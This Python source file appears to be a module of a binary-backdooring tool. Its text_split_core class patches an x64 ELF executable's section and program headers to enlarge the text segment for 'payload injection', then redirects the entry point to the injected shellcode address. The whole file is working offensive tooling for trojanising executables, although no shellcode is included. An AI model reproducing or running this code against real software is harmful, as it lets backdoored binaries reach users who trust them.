import struct
import logging
import os
from pe.core import intelCore
logger = logging.getLogger(__name__)


class text_split_core():

    def __init__(self, BDF=None):
        self.BDF = BDF    
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "text_split_core"
        self.description = """Supports splitting the text section for payload injection Intel x64"""
        self.requirements = {}

    def update_header(self):
        #64 bit FILE
        logger.info("[*] Patching x64 Binary")
        self.BDF.elf_object['loaded_binary'].seek(24, 0)
        self.BDF.elf_object['loaded_binary'].seek(16, 1)
        if self.BDF.elf_object['e_shoff'] + self.BDF.PAGE_SIZE > 0x7fffffffffffffff:
            logger.warning("[!] Such fuzz...")
            return False
        
        self.BDF.patch_instr[self.BDF.elf_object['loaded_binary'].tell()] = struct.pack(self.BDF.elf_object['endian'] + "I", self.BDF.elf_object['e_shoff'] + self.BDF.PAGE_SIZE)
        
        self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "I", self.BDF.elf_object['e_shoff'] + self.BDF.PAGE_SIZE))
        
        self.BDF.elf_object['loaded_binary'].seek(self.BDF.elf_object['e_shoff'] + self.BDF.PAGE_SIZE, 0)
        for i in range(self.BDF.elf_object['e_shnum']):
            #print "i", i, self.BDF.elf_object['sec_hdr'][i]['sh_offset'], self.BDF.newOffset
            if self.BDF.elf_object['sec_hdr'][i]['sh_offset'] >= self.BDF.newOffset:
                #print "Adding page size"
                self.BDF.elf_object['loaded_binary'].seek(24, 1)
                if self.BDF.elf_object['sec_hdr'][i]['sh_offset'] + self.BDF.PAGE_SIZE > 0x7fffffffffffffff:
                    logger.warning("[!] Fuzzing...")
                    return False
                
                self.BDF.patch_instr[self.BDF.elf_object['loaded_binary'].tell()] = struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['sec_hdr'][i]['sh_offset'] + self.BDF.PAGE_SIZE)
                self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['sec_hdr'][i]['sh_offset'] + self.BDF.PAGE_SIZE))
                self.BDF.elf_object['loaded_binary'].seek(32, 1)
            
            elif self.BDF.elf_object['sec_hdr'][i]['sh_size'] + self.BDF.elf_object['sec_hdr'][i]['sh_addr'] == self.BDF.shellcode_vaddr:
                #print "adding self.BDF.newBuffer size"
                self.BDF.elf_object['loaded_binary'].seek(32, 1)
                if self.BDF.elf_object['sec_hdr'][i]['sh_offset'] + self.BDF.newBuffer > 0x7fffffffffffffff:
                    logger.warning("[!] Melkor is cool right?")
                    return False

                self.BDF.patch_instr[self.BDF.elf_object['loaded_binary'].tell()] = struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['sec_hdr'][i]['sh_size'] + self.BDF.newBuffer)
                self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['sec_hdr'][i]['sh_size'] + self.BDF.newBuffer))
                self.BDF.elf_object['loaded_binary'].seek(24, 1)
            else:
                self.BDF.elf_object['loaded_binary'].seek(64, 1)
        
        #update the pointer to the section header table
        
        after_textSegment = False
        
        self.BDF.elf_object['loaded_binary'].seek(self.BDF.elf_object['e_phoff'], 0)

        for i in range(self.BDF.elf_object['e_phnum']):
            #print "header range i", i
            #print "self.BDF.shellcode_vaddr", hex(self.BDF.elf_object['prog_hdr'][i]['p_vaddr']), hex(self.BDF.shellcode_vaddr)
            if i == self.BDF.headerTracker:
                #print "Found Text Segment again"
                after_textSegment = True
                self.BDF.elf_object['loaded_binary'].seek(32, 1)
                if self.BDF.elf_object['prog_hdr'][i]['p_filesz'] + self.BDF.newBuffer > 0x7fffffffffffffff:
                    logger.warning("[!] Fuzz fuzz fuzz... ")
                    return False
                if self.BDF.elf_object['prog_hdr'][i]['p_memsz'] + self.BDF.newBuffer > 0x7fffffffffffffff:
                    logger.warning("[!] Someone is fuzzing...")
                    return False

                self.BDF.patch_instr[self.BDF.elf_object['loaded_binary'].tell()] = struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['prog_hdr'][i]['p_filesz'] + self.BDF.newBuffer)
                self.BDF.patch_instr['prog_hdr_cont'] = struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['prog_hdr'][i]['p_memsz'] + self.BDF.newBuffer)
                self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['prog_hdr'][i]['p_filesz'] + self.BDF.newBuffer))
                self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['prog_hdr'][i]['p_memsz'] + self.BDF.newBuffer))
                self.BDF.elf_object['loaded_binary'].seek(8, 1)
            elif after_textSegment is True:
                #print "Increasing headers after the addition"
                self.BDF.elf_object['loaded_binary'].seek(8, 1)
                if self.BDF.elf_object['prog_hdr'][i]['p_offset'] + self.BDF.PAGE_SIZE > 0x7fffffffffffffff:
                    logger.warning("[!] Nice fuzzer!")
                    return False

                self.BDF.patch_instr[self.BDF.elf_object['loaded_binary'].tell()] = struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['prog_hdr'][i]['p_offset'] + self.BDF.PAGE_SIZE)
                self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.elf_object['prog_hdr'][i]['p_offset'] + self.BDF.PAGE_SIZE))
                self.BDF.elf_object['loaded_binary'].seek(40, 1)
            else:
                self.BDF.elf_object['loaded_binary'].seek(56, 1)

        self.BDF.elf_object['loaded_binary'].seek(self.BDF.elf_object['e_entryLocOnDisk'], 0)
        if self.BDF.shellcode_vaddr > 0x7fffffffffffffff:
            logger.warning("[!] Fuzzing...")
            return False

        self.BDF.patch_instr[self.BDF.elf_object['loaded_binary'].tell()] = struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.shellcode_vaddr)
        self.BDF.elf_object['loaded_binary'].write(struct.pack(self.BDF.elf_object['endian'] + "Q", self.BDF.shellcode_vaddr))

        self.JMPtoCodeAddress = self.BDF.shellcode_vaddr - self.BDF.elf_object['e_entry'] - 5

        self.BDF.elf_object['loaded_binary'].seek(0)
        
        return True
        
        
